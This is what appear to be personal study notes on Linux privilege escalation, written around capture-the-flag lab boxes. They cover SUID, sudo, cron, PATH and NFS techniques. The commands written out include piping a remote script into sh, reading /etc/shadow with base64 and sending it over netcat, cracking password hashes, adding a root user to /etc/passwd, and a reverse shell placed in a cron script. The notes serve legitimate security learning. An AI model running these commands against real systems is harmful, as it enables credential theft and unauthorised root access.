Priv Esc? The exploitation of vulns, design flaws, or configurations in an OS or desktop app to gain unauthorized acces to resources usually restricted from users.
- Reset passwords
- Bypass access control to data
- Edit software configs
- Enable persistent access
- Change user permissions
- Execute admin commands

# Enumeration
[[hostname]]
[[uname]]
[[_proc_version]]
[[_etc_issue]]
[[ps]]
[[env]]
[[sudo]]
[[ls]]
[[id]]
[[_etc_password]]
[[history]]
[[ifconfig]] + [[ip]]
[[netstat]]
[[find]]
[[python]]

# Automated Enumeration
Dependent of environment, ie. Python not available on target system
-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Kernel Exploits
1. Identify kernel version
2. Search for exploit code for the kernel version
3. Configure/run the exploit
Careful, as some exploits can crash the kernel
https://www.linuxkernelcves.com/cves
Ex. 
1. `uname -r`, get kernel version
2. find appropriate CVE and exploit (CVE-2015-1328), and figure out language used
3. get file to remote host, move to a writeable directory
	1. `nc -lvnp PORT < exploit.c` -- `nc IP PORT > exploit.c`
4. follow exploit instructions (compile c and then run w/ `gcc exploit.c -o exploit` -- `./exploit.c`)

# Sudo
run a `sudo -l` to see all commands with delegated sudo privileges
[https://gtfobins.github.io/](https://gtfobins.github.io/) info on how programs with sudo rights can be leveraged

Application Functions ex. Apache server allows for `apache2 -f ...` to specify a config file, this will spit out an error of the first line of a file if its invalid, like /etc/shadow

### LD Preload
1. check for LD_PRELOAD (w/ env_keep option) `env_keep+=LD_PRELOAD`
2. Write C shell code compiled into a share object (.so extension) [[LD_PRELOAD]]
3. Run program with sudo rights and point LD_PRELOAD to the .so file


`sudo nmap --interactive` ?? apparently gives a shell


# SUID
find SUID executable files with `find / -type f -perm 4000 2>/dev/null`   then compare those executables against GTFOBins: https://gtfobins.github.io

ex. no exploit bin available but nano has SUID set
1. nano to copy passwd and shadow files
2. use `unshadow passwd.txt shadow.txt > passwords.txt`
3. upload with a wordlist to John the Ripper
OR
1. Generate a password with [[openssl]] `openssl passwd -1 -salt SALT PASS`
2. using nano, add new user to [[_etc_password]] with the password, give root membership
3. `su` to newly created user

Practical ex (given ssh login, low priv): 
0. hardmode it by running nmap, then brute forcing passwords with `hydra` 
1. ssh into karen's account, run `id` to get a sense of privileges
2. Based on the box, I run a `find -perm -4000...` for files that have SUID bit set (could also try `sudo -l` for other commands)
	1. Results are then checked against GTFOBins to look for an exploitable program (use SUID filter)
	2. (optional) overlook options because they don't seem sus
	3. find `base64` on GTFOBins, this will read out any file into base64, also has a --decode option 
3. `base64 /etc/shadow | base64 -d > shadow.txt` to write out, and then decode the shadow file (make sure you're in a writeable dir)
4. `nc ... < shadow.txt` to a listener to transfer files to local machine (send over `/etc/passwd `too) 
5. `unshadow PASSWD SHADOW` to get files into a format for John da Ripper to read
6. `john COMBINED_FILE` then spits out any found hashes (can also specify `--wordlist`, but the default works here)


# Capabilities
use `getcap / -r 2>/dev/null` to get a list of programs with a capabilities set. A capability being a delegated function of a binary / process that doesn't need to ask for a higher privilege user. 
Reference these results against GTFOBins to find attack vectors
ex. 
using a Vim `cap_setuid+ep` capability we can set our UID to root with the script listed on GTFOBins

  
# Cron Jobs
Scripts / binaries can be scheduled to run at specified times, they will run with privileges of owner (hopefully root), not of the current user
Stored in: `/etc/crontabs`
Often admins will create a cronjob for a script, eventually delete it, but never remove the cronjob, allowing us to create a custom script in its absence
Example:
1. `cat /etc/crontabs` to see potential cron jobs
2. 4 jobs are built to run every minute, 3 bash, 1 python
	-  Went down a rabbit hole trying to get a bash shell to work through the .sh files
3. find out which files might be accessible/writable, and see that the `test.py` script is non-existent
4. Create a `/tmp/test.py` script with python reverse shell from github [[Payloads]]
	 -  run into a bunch of issues getting it to run. Try debugging by check `which` on program calls needed, run the same command from terminal and see if it connects (to a listener), then try running the script with the current user and see if it connects
5. Run a listener and wait for the connection


# PATH
$PATH is an environment variable that tells Linux where to search for executables that are not built into the shell or defined with an absolute path.
`echo $PATH`  
- Look for write privileges to folders in $PATH
- is $PATH itself modifiable?
- are there existing scripts that can be leveraged to run a binary?
Example:
1. I search the system `find -perm -4000 ...` for any files that have a SUID bit set. I see `/home/murdoch`, which is also a writable directory 
2. In there we find a compiled file `test` and its originating, uncompiled version `thm.py`. With `cat thm.py` we see that it's trying to run a command called 'thm'.
3. I add this writable dir to the $PATH with `export PATH=$PATH=/home/murdoch`
4. In the same dir, (since its writable and now in PATH) I add a bash script named `thm` that cat's the flag file and `chmod 777 thm`.
5. I run the `test` file which has SUID bit set, and it accesses my injected `thm` command, now running as root and am able to cat the flag

  
# NFS
Network File Sharing config is viewable in `/etc/exports`. Often share folders and remote management tools like SSH and Telnet can be leveraged for root.
(by default NFS will strip all permissions on files and drop user to "nfsnobody")  
`cat /etc/exports` if the `no_root_squash` option is added on a writable share, then we can create an executable with SUID set.
`showmount -e TARGET` to list share folders on the target (from local)
`mount -o rw TARGET:/SHARE_DIR /MY_DIR` to copy over the share to local
Example:
1. search system for exportable shares with `cat /etc/exports`   
2. Notice that they all have `no_root_squash` set. Look into each to find which is executable from, tried /tmp as this is usually an accessible dir, which proved right
3. back on local `showmount` and then create a `/tmp/backups` dir to copy over the share with `mount -o rw TARGET:/tmp /tmp/backups`
4. Create a executable here that sets as root and opens a shell, (see [[gcc]]) then `gcc test.c -o test -w`
5. `chmod 4700 test` to grant it SUID bit so that any user can run it on the target system
6. See that the file has been copied over to target, run it as normal user, then get root shell :)


# Capstone
1. No obvious exploits for kernel version (`uname -a` + web search), no Cron Job(`/etc/crontab`), no NFS (`/etc/exports`), nothing apparent in PATH (did search these for a bit, but should've just ran a SUID search first to avoid the rabbit hole), and no sudo on user `leonard`.
2. `bash -li` and saw there was history, got a clue from this seeing as user `missy` was accessed recently
3. ran a `find -perm -4000` and saw SUID was set on Base64 (again)
4. used `base64` to read and send `/etc/shadow` to my local with nc, along with `/etc/passwd`. Fed to Johnny who got me the password for missy
5. got the first flag from missy `/home/Documents` directory
	-  also skipped part 2 by just base64'ing out flag2.txt from `/home/rootflag.txt`
6. ran a `sudo -l` for missy and saw she had sudo on `find`
7. compared this to GTFOBins which gave a script to get root shell through` find`
8. activated root shell and ran a find on `flag2.txt`, got flag